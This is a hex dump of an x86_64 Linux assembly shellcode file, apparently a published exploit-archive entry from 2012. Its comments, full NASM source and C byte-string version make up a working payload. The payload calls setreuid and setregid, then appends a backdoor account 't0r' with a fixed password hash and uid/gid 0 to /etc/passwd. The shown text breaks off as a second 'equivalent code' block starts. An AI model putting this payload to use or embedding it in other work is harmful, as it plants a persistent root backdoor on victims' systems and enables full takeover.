00000000  3b 73 63 5f 61 64 64 75  73 65 72 30 31 2e 53 0d  |;sc_adduser01.S.|
00000010  0a 3b 41 72 63 68 3a 20  20 20 20 20 20 20 20 20  |.;Arch:         |
00000020  20 78 38 36 5f 36 34 2c  20 4c 69 6e 75 78 0d 0a  | x86_64, Linux..|
00000030  3b 0d 0a 3b 41 75 74 68  6f 72 3a 20 20 20 20 20  |;..;Author:     |
00000040  20 20 20 30 5f 6f 20 2d  2d 20 6e 75 6c 6c 5f 6e  |   0_o -- null_n|
00000050  75 6c 6c 0d 0a 3b 20 20  20 20 20 20 20 20 20 20  |ull..;          |
00000060  20 6e 75 31 31 2e 6e 75  31 31 20 5b 61 74 5d 20  | nu11.nu11 [at] |
00000070  79 61 68 6f 6f 2e 63 6f  6d 0d 0a 3b 44 61 74 65  |yahoo.com..;Date|
00000080  3a 20 20 20 20 20 20 20  20 20 20 32 30 31 32 2d  |:          2012-|
00000090  30 33 2d 30 35 0d 0a 3b  0d 0a 3b 63 6f 6d 70 69  |03-05..;..;compi|
000000a0  6c 65 20 61 6e 20 65 78  65 63 75 74 61 62 6c 65  |le an executable|
000000b0  3a 20 6e 61 73 6d 20 2d  66 20 65 6c 66 36 34 20  |: nasm -f elf64 |
000000c0  73 63 5f 61 64 64 75 73  65 72 2e 53 0d 0a 3b 20  |sc_adduser.S..; |
000000d0  20 20 20 20 20 20 20 20  20 20 6c 64 20 2d 6f 20  |          ld -o |
000000e0  73 63 5f 61 64 64 75 73  65 72 20 73 63 5f 61 64  |sc_adduser sc_ad|
000000f0  64 75 73 65 72 2e 6f 0d  0a 3b 63 6f 6d 70 69 6c  |duser.o..;compil|
00000100  65 20 61 6e 20 6f 62 6a  65 63 74 3a 20 6e 61 73  |e an object: nas|
00000110  6d 20 2d 6f 20 73 63 5f  61 64 64 75 73 65 72 5f  |m -o sc_adduser_|
00000120  6f 62 6a 20 73 63 5f 61  64 64 75 73 65 72 2e 53  |obj sc_adduser.S|
00000130  0d 0a 3b 0d 0a 3b 50 75  72 70 6f 73 65 3a 20 20  |..;..;Purpose:  |
00000140  20 20 20 20 20 61 64 64  73 20 75 73 65 72 20 22  |     adds user "|
00000150  74 30 72 22 20 77 69 74  68 20 70 61 73 73 77 6f  |t0r" with passwo|
00000160  72 64 20 22 57 69 6e 6e  65 72 22 20 74 6f 20 2f  |rd "Winner" to /|
00000170  65 74 63 2f 70 61 73 73  77 64 0d 0a 3b 65 78 65  |etc/passwd..;exe|
00000180  63 75 74 65 64 20 73 79  73 63 61 6c 6c 73 3a 20  |cuted syscalls: |
00000190  20 20 20 20 73 65 74 72  65 75 69 64 2c 20 73 65  |    setreuid, se|
000001a0  74 72 65 67 69 64 2c 20  6f 70 65 6e 2c 20 77 72  |tregid, open, wr|
000001b0  69 74 65 2c 20 63 6c 6f  73 65 2c 20 65 78 69 74  |ite, close, exit|
000001c0  0d 0a 3b 52 65 73 75 6c  74 3a 20 20 20 20 20 20  |..;Result:      |
000001d0  20 20 74 30 72 3a 33 55  67 54 35 74 58 4b 55 6b  |  t0r:3UgT5tXKUk|
000001e0  55 46 67 3a 30 3a 30 3a  3a 2f 72 6f 6f 74 3a 2f  |UFg:0:0::/root:/|
000001f0  62 69 6e 2f 62 61 73 68  0d 0a 3b 73 79 73 63 61  |bin/bash..;sysca|
00000200  6c 6c 20 6f 70 20 63 6f  64 65 73 3a 20 20 2f 75  |ll op codes:  /u|
00000210  73 72 2f 69 6e 63 6c 75  64 65 2f 78 38 36 5f 36  |sr/include/x86_6|
00000220  34 2d 6c 69 6e 75 78 2d  67 6e 75 2f 61 73 6d 2f  |4-linux-gnu/asm/|
00000230  75 6e 69 73 74 64 5f 36  34 2e 68 0d 0a 42 49 54  |unistd_64.h..BIT|
00000240  53 20 36 34 0d 0a 5b 53  45 43 54 49 4f 4e 20 2e  |S 64..[SECTION .|
00000250  74 65 78 74 5d 0d 0a 67  6c 6f 62 61 6c 20 5f 73  |text]..global _s|
00000260  74 61 72 74 0d 0a 5f 73  74 61 72 74 3a 0d 0a 20  |tart.._start:.. |
00000270  20 20 20 3b 73 79 73 5f  73 65 74 72 65 75 69 64  |   ;sys_setreuid|
00000280  28 75 69 6e 74 20 72 75  69 64 2c 20 75 69 6e 74  |(uint ruid, uint|
00000290  20 65 75 69 64 29 0d 0a  20 20 20 20 20 20 20 20  | euid)..        |
000002a0  78 6f 72 20 20 20 20 20  72 61 78 2c 20 20 20 20  |xor     rax,    |
000002b0  72 61 78 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |rax..        mov|
000002c0  20 20 20 20 20 61 6c 2c  20 20 20 20 20 31 31 33  |     al,     113|
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  20 20 20 20 20 3b 73 79  73 63 61 6c 6c 20 73 79  |     ;syscall sy|
000002f0  73 5f 73 65 74 72 65 75  69 64 0d 0a 20 20 20 20  |s_setreuid..    |
00000300  20 20 20 20 78 6f 72 20  20 20 20 20 72 62 78 2c  |    xor     rbx,|
00000310  20 20 20 20 72 62 78 20  20 20 20 20 20 20 20 20  |    rbx         |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 3b 61 72 67  |            ;arg|
00000330  20 31 20 2d 2d 20 73 65  74 20 72 65 61 6c 20 75  | 1 -- set real u|
00000340  69 64 20 74 6f 20 72 6f  6f 74 0d 0a 20 20 20 20  |id to root..    |
00000350  20 20 20 20 6d 6f 76 20  20 20 20 20 72 63 78 2c  |    mov     rcx,|
00000360  20 20 20 20 72 62 78 20  20 20 20 20 20 20 20 20  |    rbx         |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 3b 61 72 67  |            ;arg|
00000380  20 32 20 2d 2d 20 73 65  74 20 65 66 66 65 63 74  | 2 -- set effect|
00000390  69 76 65 20 75 69 64 20  74 6f 20 72 6f 6f 74 0d  |ive uid to root.|
000003a0  0a 20 20 20 20 20 20 20  20 73 79 73 63 61 6c 6c  |.        syscall|
000003b0  0d 0a 20 20 20 20 20 20  20 20 3b 73 79 73 5f 73  |..        ;sys_s|
000003c0  65 74 72 65 67 69 64 28  75 69 6e 74 20 72 67 69  |etregid(uint rgi|
000003d0  64 2c 20 75 69 6e 74 20  65 67 69 64 29 0d 0a 20  |d, uint egid).. |
000003e0  20 20 20 20 20 20 20 78  6f 72 20 20 20 20 20 72  |       xor     r|
000003f0  61 78 2c 20 20 20 20 72  61 78 0d 0a 20 20 20 20  |ax,    rax..    |
00000400  20 20 20 20 6d 6f 76 20  20 20 20 20 61 6c 2c 20  |    mov     al, |
00000410  20 20 20 20 31 31 34 20  20 20 20 20 20 20 20 20  |    114         |
00000420  20 20 20 20 20 20 20 20  20 20 20 20 3b 73 79 73  |            ;sys|
00000430  63 61 6c 6c 20 73 79 73  5f 73 65 74 72 65 67 69  |call sys_setregi|
00000440  64 0d 0a 20 20 20 20 78  6f 72 20 20 20 20 20 72  |d..    xor     r|
00000450  62 78 2c 20 20 20 20 72  62 78 20 20 20 20 20 20  |bx,    rbx      |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000470  61 72 67 20 31 20 2d 2d  20 73 65 74 20 72 65 61  |arg 1 -- set rea|
00000480  6c 20 75 69 64 20 74 6f  20 72 6f 6f 74 0d 0a 20  |l uid to root.. |
00000490  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 20 72  |       mov     r|
000004a0  63 78 2c 20 20 20 20 72  62 78 20 20 20 20 20 20  |cx,    rbx      |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
000004c0  61 72 67 20 32 20 2d 2d  20 73 65 74 20 65 66 66  |arg 2 -- set eff|
000004d0  65 63 74 69 76 65 20 75  69 64 20 74 6f 20 72 6f  |ective uid to ro|
000004e0  6f 74 0d 0a 20 20 20 20  20 20 20 20 73 79 73 63  |ot..        sysc|
000004f0  61 6c 6c 0d 0a 20 20 20  20 3b 70 75 73 68 20 61  |all..    ;push a|
00000500  6c 6c 20 73 74 72 69 6e  67 73 20 6f 6e 20 74 68  |ll strings on th|
00000510  65 20 73 74 61 63 6b 20  70 72 69 6f 72 20 74 6f  |e stack prior to|
00000520  20 66 69 6c 65 20 6f 70  65 72 61 74 69 6f 6e 73  | file operations|
00000530  2e 0d 0a 20 20 20 20 78  6f 72 20 72 62 78 2c 20  |...    xor rbx, |
00000540  20 20 20 72 62 78 0d 0a  20 20 20 20 6d 6f 76 20  |   rbx..    mov |
00000550  20 20 20 20 65 62 78 2c  20 20 20 20 30 78 36 34  |    ebx,    0x64|
00000560  37 37 37 33 46 46 0d 0a  20 20 20 20 20 20 20 20  |7773FF..        |
00000570  73 68 72 20 20 20 20 20  72 62 78 2c 20 20 20 20  |shr     rbx,    |
00000580  38 0d 0a 20 20 20 20 20  20 20 20 70 75 73 68 20  |8..        push |
00000590  20 20 20 72 62 78 20 20  20 20 20 20 20 20 20 20  |   rbx          |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005b0  20 20 20 3b 73 74 72 69  6e 67 20 5c 30 30 64 77  |   ;string \00dw|
000005c0  73 0d 0a 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |s..        mov  |
000005d0  20 20 20 72 62 78 2c 20  20 20 20 30 78 37 33 36  |   rbx,    0x736|
000005e0  31 37 30 32 66 36 33 37  34 36 35 32 66 0d 0a 20  |1702f6374652f.. |
000005f0  20 20 20 20 20 20 20 70  75 73 68 20 20 20 20 72  |       push    r|
00000600  62 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |bx              |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000620  73 74 72 69 6e 67 20 73  61 70 2f 63 74 65 2f 0d  |string sap/cte/.|
00000630  0a 20 20 20 20 6d 6f 76  20 20 20 20 20 72 62 78  |.    mov     rbx|
00000640  2c 20 20 20 20 30 78 30  41 36 38 37 33 36 31 36  |,    0x0A6873616|
00000650  32 32 46 36 45 46 46 0d  0a 20 20 20 20 20 20 20  |22F6EFF..       |
00000660  20 73 68 72 20 20 20 20  20 72 62 78 2c 20 20 20  | shr     rbx,   |
00000670  20 38 0d 0a 20 20 20 20  20 20 20 20 70 75 73 68  | 8..        push|
00000680  20 20 20 20 72 62 78 20  20 20 20 20 20 20 20 20  |    rbx         |
00000690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006a0  20 20 20 20 3b 73 74 72  69 6e 67 20 5c 30 30 5c  |    ;string \00\|
000006b0  6e 68 73 61 62 2f 6e 0d  0a 20 20 20 20 20 20 20  |nhsab/n..       |
000006c0  20 6d 6f 76 20 20 20 20  20 72 62 78 2c 20 20 20  | mov     rbx,   |
000006d0  20 30 78 36 39 36 32 32  46 33 41 37 34 36 46 36  | 0x69622F3A746F6|
000006e0  46 37 32 0d 0a 20 20 20  20 20 20 20 20 70 75 73  |F72..        pus|
000006f0  68 20 20 20 20 72 62 78  20 20 20 20 20 20 20 20  |h    rbx        |
00000700  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000710  20 20 20 20 20 3b 73 74  72 69 6e 67 20 69 62 2f  |     ;string ib/|
00000720  3a 74 6f 6f 72 0d 0a 20  20 20 20 20 20 20 20 6d  |:toor..        m|
00000730  6f 76 20 20 20 20 20 72  62 78 2c 20 20 20 20 30  |ov     rbx,    0|
00000740  78 32 46 33 41 33 41 33  30 33 41 33 30 33 41 36  |x2F3A3A303A303A6|
00000750  37 0d 0a 20 20 20 20 20  20 20 20 70 75 73 68 20  |7..        push |
00000760  20 20 20 72 62 78 20 20  20 20 20 20 20 20 20 20  |   rbx          |
00000770  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000780  20 20 20 3b 73 74 72 69  6e 67 20 2f 3a 3a 30 3a  |   ;string /::0:|
00000790  30 3a 67 0d 0a 20 20 20  20 6d 6f 76 20 72 62 78  |0:g..    mov rbx|
000007a0  2c 20 20 20 20 30 78 34  36 35 35 36 42 35 35 34  |,    0x46556B554|
000007b0  42 35 38 37 34 33 35 0d  0a 20 20 20 20 70 75 73  |B587435..    pus|
000007c0  68 20 20 20 20 72 62 78  20 20 20 20 20 20 20 20  |h    rbx        |
000007d0  20 20 20 20 20 3b 73 74  72 69 6e 67 20 46 55 6b  |     ;string FUk|
000007e0  55 4b 58 74 35 0d 0a 20  20 20 20 6d 6f 76 20 72  |UKXt5..    mov r|
000007f0  62 78 2c 20 20 20 20 30  78 35 34 36 37 35 35 33  |bx,    0x5467553|
00000800  33 33 41 37 32 33 30 37  34 0d 0a 20 20 20 20 70  |33A723074..    p|
00000810  75 73 68 20 20 20 20 72  62 78 20 20 20 20 20 20  |ush    rbx      |
00000820  20 20 20 20 20 20 20 3b  73 74 72 69 6e 67 20 54  |       ;string T|
00000830  67 55 33 3a 72 30 74 0d  0a 20 20 20 20 3b 70 72  |gU3:r0t..    ;pr|
00000840  65 6c 75 64 65 20 74 6f  20 64 6f 69 6e 67 20 61  |elude to doing a|
00000850  6e 79 74 68 69 6e 67 20  75 73 65 66 75 6c 2e 2e  |nything useful..|
00000860  2e 0d 0a 20 20 20 20 6d  6f 76 20 72 62 78 2c 20  |...    mov rbx, |
00000870  20 20 20 72 73 70 20 20  20 20 20 20 20 20 20 3b  |   rsp         ;|
00000880  73 61 76 65 20 73 74 61  63 6b 20 70 6f 69 6e 74  |save stack point|
00000890  65 72 20 66 6f 72 20 6c  61 74 65 72 20 75 73 65  |er for later use|
000008a0  0d 0a 20 20 20 20 70 75  73 68 20 20 20 20 72 62  |..    push    rb|
000008b0  70 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 73  |p             ;s|
000008c0  74 6f 72 65 20 62 61 73  65 20 70 6f 69 6e 74 65  |tore base pointe|
000008d0  72 20 74 6f 20 73 74 61  63 6b 20 73 6f 20 69 74  |r to stack so it|
000008e0  20 63 61 6e 20 62 65 20  72 65 73 74 6f 72 65 64  | can be restored|
000008f0  20 6c 61 74 65 72 0d 0a  20 20 20 20 6d 6f 76 20  | later..    mov |
00000900  72 62 70 2c 20 20 20 20  72 73 70 20 20 20 20 20  |rbp,    rsp     |
00000910  20 20 20 20 3b 73 65 74  20 62 61 73 65 20 70 6f  |    ;set base po|
00000920  69 6e 74 65 72 20 74 6f  20 63 75 72 72 65 6e 74  |inter to current|
00000930  20 73 74 61 63 6b 20 70  6f 69 6e 74 65 72 0d 0a  | stack pointer..|
00000940  20 20 20 20 3b 73 79 73  5f 6f 70 65 6e 28 63 68  |    ;sys_open(ch|
00000950  61 72 2a 20 66 6e 61 6d  65 2c 20 69 6e 74 20 66  |ar* fname, int f|
00000960  6c 61 67 73 2c 20 69 6e  74 20 6d 6f 64 65 29 0d  |lags, int mode).|
00000970  0a 20 20 20 20 73 75 62  20 72 73 70 2c 20 20 20  |.    sub rsp,   |
00000980  20 20 20 20 20 31 36 0d  0a 20 20 20 20 6d 6f 76  |     16..    mov|
00000990  20 5b 72 62 70 20 2d 20  31 36 5d 2c 20 72 62 78  | [rbp - 16], rbx|
000009a0  20 20 20 20 20 3b 73 74  6f 72 65 20 70 6f 69 6e  |     ;store poin|
000009b0  74 65 72 20 74 6f 20 22  74 30 72 2e 2e 2e 2e 2f  |ter to "t0r..../|
000009c0  62 61 73 68 22 0d 0a 20  20 20 20 6d 6f 76 20 73  |bash"..    mov s|
000009d0  69 2c 20 20 20 20 20 30  78 30 34 30 31 20 20 20  |i,     0x0401   |
000009e0  20 20 20 3b 61 72 67 20  32 20 2d 2d 20 66 6c 61  |   ;arg 2 -- fla|
000009f0  67 73 0d 0a 20 20 20 20  6d 6f 76 20 72 64 69 2c  |gs..    mov rdi,|
00000a00  20 20 20 20 20 20 20 20  72 62 78 0d 0a 20 20 20  |        rbx..   |
00000a10  20 61 64 64 20 72 64 69  2c 20 20 20 20 20 20 20  | add rdi,       |
00000a20  20 34 30 20 20 20 20 20  20 3b 61 72 67 20 31 20  | 40      ;arg 1 |
00000a30  2d 2d 20 70 6f 69 6e 74  65 72 20 74 6f 20 22 2f  |-- pointer to "/|
00000a40  65 74 63 2f 70 61 73 73  77 64 22 0d 0a 20 20 20  |etc/passwd"..   |
00000a50  20 78 6f 72 20 72 61 78  2c 20 20 20 20 20 20 20  | xor rax,       |
00000a60  20 72 61 78 0d 0a 20 20  20 20 6d 6f 76 20 61 6c  | rax..    mov al|
00000a70  2c 20 20 20 20 20 32 20  20 20 20 20 20 20 3b 73  |,     2       ;s|
00000a80  79 73 63 61 6c 6c 20 73  79 73 5f 6f 70 65 6e 0d  |yscall sys_open.|
00000a90  0a 20 20 20 20 73 79 73  63 61 6c 6c 0d 0a 20 20  |.    syscall..  |
00000aa0  20 20 3b 73 79 73 5f 77  72 69 74 65 28 75 69 6e  |  ;sys_write(uin|
00000ab0  74 20 66 64 2c 20 63 68  61 72 2a 20 62 75 66 2c  |t fd, char* buf,|
00000ac0  20 75 69 6e 74 20 73 69  7a 65 29 0d 0a 20 20 20  | uint size)..   |
00000ad0  20 6d 6f 76 20 5b 72 62  70 20 2d 20 34 5d 2c 20  | mov [rbp - 4], |
00000ae0  20 65 61 78 20 20 20 20  20 3b 61 72 67 20 31 20  | eax     ;arg 1 |
00000af0  2d 2d 20 66 64 20 69 73  20 72 65 74 76 61 6c 20  |-- fd is retval |
00000b00  6f 66 20 73 79 73 5f 6f  70 65 6e 2e 20 73 61 76  |of sys_open. sav|
00000b10  65 20 66 64 20 74 6f 20  73 74 61 63 6b 20 66 6f  |e fd to stack fo|
00000b20  72 20 6c 61 74 65 72 20  75 73 65 2e 0d 0a 20 20  |r later use...  |
00000b30  20 20 6d 6f 76 20 72 63  78 2c 20 20 20 20 20 20  |  mov rcx,      |
00000b40  20 20 72 62 78 20 20 20  20 20 3b 61 72 67 20 32  |  rbx     ;arg 2|
00000b50  20 2d 2d 20 6c 6f 61 64  20 72 63 78 20 77 69 74  | -- load rcx wit|
00000b60  68 20 70 6f 69 6e 74 65  72 20 74 6f 20 73 74 72  |h pointer to str|
00000b70  69 6e 67 20 22 74 30 72  2e 2e 2e 2f 62 61 73 68  |ing "t0r.../bash|
00000b80  22 0d 0a 20 20 20 20 78  6f 72 20 72 64 78 2c 20  |"..    xor rdx, |
00000b90  20 20 20 20 20 20 20 72  64 78 0d 0a 20 20 20 20  |       rdx..    |
00000ba0  6d 6f 76 20 64 6c 2c 20  20 20 20 20 33 39 20 20  |mov dl,     39  |
00000bb0  20 20 20 20 3b 61 72 67  20 33 20 2d 2d 20 6c 6f  |    ;arg 3 -- lo|
00000bc0  61 64 20 72 64 78 20 77  69 74 68 20 73 69 7a 65  |ad rdx with size|
00000bd0  20 6f 66 20 73 74 72 69  6e 67 20 22 74 30 72 2e  | of string "t0r.|
00000be0  2e 2e 2f 62 61 73 68 5c  30 30 22 0d 0a 20 20 20  |../bash\00"..   |
00000bf0  20 6d 6f 76 20 72 73 69  2c 20 20 20 20 20 20 20  | mov rsi,       |
00000c00  20 72 63 78 20 20 20 20  20 3b 61 72 67 20 32 20  | rcx     ;arg 2 |
00000c10  2d 2d 20 6d 6f 76 65 20  74 6f 20 73 6f 75 72 63  |-- move to sourc|
00000c20  65 20 69 6e 64 65 78 20  72 65 67 69 73 74 65 72  |e index register|
00000c30  0d 0a 20 20 20 20 6d 6f  76 20 72 64 69 2c 20 20  |..    mov rdi,  |
00000c40  20 20 20 20 20 20 72 61  78 20 20 20 20 20 3b 61  |      rax     ;a|
00000c50  72 67 20 31 20 2d 2d 20  6d 6f 76 65 20 74 6f 20  |rg 1 -- move to |
00000c60  64 65 73 74 69 6e 61 74  69 6f 6e 20 69 6e 64 65  |destination inde|
00000c70  78 20 72 65 67 69 73 74  65 72 0d 0a 20 20 20 20  |x register..    |
00000c80  78 6f 72 20 20 20 20 20  72 61 78 2c 20 20 20 20  |xor     rax,    |
00000c90  20 20 20 20 20 20 20 20  72 61 78 0d 0a 20 20 20  |        rax..   |
00000ca0  20 20 20 20 20 6d 6f 76  20 20 20 20 20 61 6c 2c  |     mov     al,|
00000cb0  20 20 20 20 20 20 20 20  20 20 20 20 20 31 20 20  |             1  |
00000cc0  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 73 79  |             ;sy|
00000cd0  73 63 61 6c 6c 20 73 79  73 5f 77 72 69 74 65 0d  |scall sys_write.|
00000ce0  0a 20 20 20 20 20 20 20  20 73 79 73 63 61 6c 6c  |.        syscall|
00000cf0  0d 0a 20 20 20 20 3b 73  79 73 5f 63 6c 6f 73 65  |..    ;sys_close|
00000d00  28 75 69 6e 74 20 66 64  29 0d 0a 20 20 20 20 78  |(uint fd)..    x|
00000d10  6f 72 20 72 64 69 2c 20  20 20 20 20 20 20 20 72  |or rdi,        r|
00000d20  64 69 0d 0a 20 20 20 20  6d 6f 76 20 65 64 69 2c  |di..    mov edi,|
00000d30  20 20 20 20 20 20 20 20  5b 72 62 70 20 2d 20 34  |        [rbp - 4|
00000d40  5d 20 20 20 3b 61 72 67  20 31 20 2d 2d 20 6c 6f  |]   ;arg 1 -- lo|
00000d50  61 64 20 73 74 6f 72 65  64 20 66 69 6c 65 20 64  |ad stored file d|
00000d60  65 73 63 72 69 70 74 6f  72 20 74 6f 20 64 65 73  |escriptor to des|
00000d70  74 69 6e 61 74 69 6f 6e  20 69 6e 64 65 78 20 72  |tination index r|
00000d80  65 67 69 73 74 65 72 0d  0a 20 20 20 20 78 6f 72  |egister..    xor|
00000d90  20 72 61 78 2c 20 20 20  20 20 20 20 20 72 61 78  | rax,        rax|
00000da0  0d 0a 20 20 20 20 6d 6f  76 20 61 6c 2c 20 20 20  |..    mov al,   |
00000db0  20 20 33 20 20 20 20 20  20 20 3b 73 79 73 63 61  |  3       ;sysca|
00000dc0  6c 6c 20 73 79 73 5f 63  6c 6f 73 65 0d 0a 20 20  |ll sys_close..  |
00000dd0  20 20 73 79 73 63 61 6c  6c 0d 0a 20 20 20 20 3b  |  syscall..    ;|
00000de0  73 79 73 5f 65 78 69 74  28 69 6e 74 20 65 72 72  |sys_exit(int err|
00000df0  5f 63 6f 64 65 29 0d 0a  20 20 20 20 78 6f 72 20  |_code)..    xor |
00000e00  72 61 78 2c 20 20 20 20  72 61 78 0d 0a 20 20 20  |rax,    rax..   |
00000e10  20 6d 6f 76 20 61 6c 2c  20 36 30 20 20 20 20 20  | mov al, 60     |
00000e20  20 20 20 20 20 3b 73 79  73 63 61 6c 6c 20 73 79  |     ;syscall sy|
00000e30  73 5f 65 78 69 74 0d 0a  20 20 20 20 78 6f 72 20  |s_exit..    xor |
00000e40  72 62 78 2c 20 20 20 20  72 62 78 20 20 20 20 20  |rbx,    rbx     |
00000e50  20 20 20 20 3b 61 72 67  20 31 20 2d 2d 20 65 72  |    ;arg 1 -- er|
00000e60  72 6f 72 20 63 6f 64 65  0d 0a 20 20 20 20 73 79  |ror code..    sy|
00000e70  73 63 61 6c 6c 0d 0a 3b  63 68 61 72 20 73 68 65  |scall..;char she|
00000e80  6c 6c 63 6f 64 65 5b 5d  20 3d 0d 0a 3b 20 20 20  |llcode[] =..;   |
00000e90  22 5c 78 34 38 5c 78 33  31 5c 78 63 30 5c 78 62  |"\x48\x31\xc0\xb|
00000ea0  30 5c 78 37 31 5c 78 34  38 5c 78 33 31 5c 78 64  |0\x71\x48\x31\xd|
00000eb0  62 5c 78 34 38 5c 78 33  31 5c 78 63 39 5c 78 30  |b\x48\x31\xc9\x0|
00000ec0  66 5c 78 30 35 5c 78 34  38 5c 78 33 31 22 0d 0a  |f\x05\x48\x31"..|
00000ed0  3b 20 20 20 22 5c 78 63  30 5c 78 62 30 5c 78 37  |;   "\xc0\xb0\x7|
00000ee0  32 5c 78 34 38 5c 78 33  31 5c 78 64 62 5c 78 34  |2\x48\x31\xdb\x4|
00000ef0  38 5c 78 33 31 5c 78 63  39 5c 78 30 66 5c 78 30  |8\x31\xc9\x0f\x0|
00000f00  35 5c 78 34 38 5c 78 33  31 5c 78 64 62 5c 78 62  |5\x48\x31\xdb\xb|
00000f10  62 22 0d 0a 3b 20 20 20  22 5c 78 66 66 5c 78 37  |b"..;   "\xff\x7|
00000f20  33 5c 78 37 37 5c 78 36  34 5c 78 34 38 5c 78 63  |3\x77\x64\x48\xc|
00000f30  31 5c 78 65 62 5c 78 30  38 5c 78 35 33 5c 78 34  |1\xeb\x08\x53\x4|
00000f40  38 5c 78 62 62 5c 78 32  66 5c 78 36 35 5c 78 37  |8\xbb\x2f\x65\x7|
00000f50  34 5c 78 36 33 22 0d 0a  3b 20 20 20 22 5c 78 32  |4\x63"..;   "\x2|
00000f60  66 5c 78 37 30 5c 78 36  31 5c 78 37 33 5c 78 35  |f\x70\x61\x73\x5|
00000f70  33 5c 78 34 38 5c 78 62  62 5c 78 66 66 5c 78 36  |3\x48\xbb\xff\x6|
00000f80  65 5c 78 32 66 5c 78 36  32 5c 78 36 31 5c 78 37  |e\x2f\x62\x61\x7|
00000f90  33 5c 78 36 38 5c 78 30  61 22 0d 0a 3b 20 20 20  |3\x68\x0a"..;   |
00000fa0  22 5c 78 34 38 5c 78 63  31 5c 78 65 62 5c 78 30  |"\x48\xc1\xeb\x0|
00000fb0  38 5c 78 35 33 5c 78 34  38 5c 78 62 62 5c 78 37  |8\x53\x48\xbb\x7|
00000fc0  32 5c 78 36 66 5c 78 36  66 5c 78 37 34 5c 78 33  |2\x6f\x6f\x74\x3|
00000fd0  61 5c 78 32 66 5c 78 36  32 5c 78 36 39 22 0d 0a  |a\x2f\x62\x69"..|
00000fe0  3b 20 20 20 22 5c 78 35  33 5c 78 34 38 5c 78 62  |;   "\x53\x48\xb|
00000ff0  62 5c 78 36 37 5c 78 33  61 5c 78 33 30 5c 78 33  |b\x67\x3a\x30\x3|
00001000  61 5c 78 33 30 5c 78 33  61 5c 78 33 61 5c 78 32  |a\x30\x3a\x3a\x2|
00001010  66 5c 78 35 33 5c 78 34  38 5c 78 62 62 5c 78 33  |f\x53\x48\xbb\x3|
00001020  35 22 0d 0a 3b 20 20 20  22 5c 78 37 34 5c 78 35  |5"..;   "\x74\x5|
00001030  38 5c 78 34 62 5c 78 35  35 5c 78 36 62 5c 78 35  |8\x4b\x55\x6b\x5|
00001040  35 5c 78 34 36 5c 78 35  33 5c 78 34 38 5c 78 62  |5\x46\x53\x48\xb|
00001050  62 5c 78 37 34 5c 78 33  30 5c 78 37 32 5c 78 33  |b\x74\x30\x72\x3|
00001060  61 5c 78 33 33 22 0d 0a  3b 20 20 20 22 5c 78 35  |a\x33"..;   "\x5|
00001070  35 5c 78 36 37 5c 78 35  34 5c 78 35 33 5c 78 34  |5\x67\x54\x53\x4|
00001080  38 5c 78 38 39 5c 78 65  33 5c 78 35 35 5c 78 34  |8\x89\xe3\x55\x4|
00001090  38 5c 78 38 39 5c 78 65  35 5c 78 34 38 5c 78 38  |8\x89\xe5\x48\x8|
000010a0  33 5c 78 65 63 5c 78 31  30 22 0d 0a 3b 20 20 20  |3\xec\x10"..;   |
000010b0  22 5c 78 34 38 5c 78 38  39 5c 78 35 64 5c 78 66  |"\x48\x89\x5d\xf|
000010c0  30 5c 78 36 36 5c 78 62  65 5c 78 30 31 5c 78 30  |0\x66\xbe\x01\x0|
000010d0  34 5c 78 34 38 5c 78 38  39 5c 78 64 66 5c 78 34  |4\x48\x89\xdf\x4|
000010e0  38 5c 78 38 33 5c 78 63  37 5c 78 32 38 22 0d 0a  |8\x83\xc7\x28"..|
000010f0  3b 20 20 20 22 5c 78 34  38 5c 78 33 31 5c 78 63  |;   "\x48\x31\xc|
00001100  30 5c 78 62 30 5c 78 30  32 5c 78 30 66 5c 78 30  |0\xb0\x02\x0f\x0|
00001110  35 5c 78 38 39 5c 78 34  35 5c 78 66 63 5c 78 34  |5\x89\x45\xfc\x4|
00001120  38 5c 78 38 39 5c 78 64  39 5c 78 34 38 5c 78 33  |8\x89\xd9\x48\x3|
00001130  31 22 0d 0a 3b 20 20 20  22 5c 78 64 32 5c 78 62  |1"..;   "\xd2\xb|
00001140  32 5c 78 32 37 5c 78 34  38 5c 78 38 39 5c 78 63  |2\x27\x48\x89\xc|
00001150  65 5c 78 34 38 5c 78 38  39 5c 78 63 37 5c 78 34  |e\x48\x89\xc7\x4|
00001160  38 5c 78 33 31 5c 78 63  30 5c 78 62 30 5c 78 30  |8\x31\xc0\xb0\x0|
00001170  31 5c 78 30 66 22 0d 0a  3b 20 20 20 22 5c 78 30  |1\x0f"..;   "\x0|
00001180  35 5c 78 34 38 5c 78 33  31 5c 78 66 66 5c 78 38  |5\x48\x31\xff\x8|
00001190  62 5c 78 37 64 5c 78 66  63 5c 78 34 38 5c 78 33  |b\x7d\xfc\x48\x3|
000011a0  31 5c 78 63 30 5c 78 62  30 5c 78 30 33 5c 78 30  |1\xc0\xb0\x03\x0|
000011b0  66 5c 78 30 35 5c 78 34  38 22 0d 0a 3b 20 20 20  |f\x05\x48"..;   |
000011c0  22 5c 78 33 31 5c 78 63  30 5c 78 62 30 5c 78 33  |"\x31\xc0\xb0\x3|
000011d0  63 5c 78 34 38 5c 78 33  31 5c 78 64 62 5c 78 30  |c\x48\x31\xdb\x0|
000011e0  66 5c 78 30 35 22 3b 0d  0a 3b 0d 0a 3b 65 71 75  |f\x05";..;..;equ|
000011f0  69 76 61 6c 65 6e 74 20  63 6f 64 65 3a 0d 0a 3b  |ivalent code:..;|
00001200  0d 0a 3b 63 68 61 72 20  73 68 65 6c 6c 63 6f 64  |..;char shellcod|
00001210  65 5b 5d 20 3d 0d 0a 3b  20 20 20 22 5c 78 34 38  |e[] =..;   "\x48|
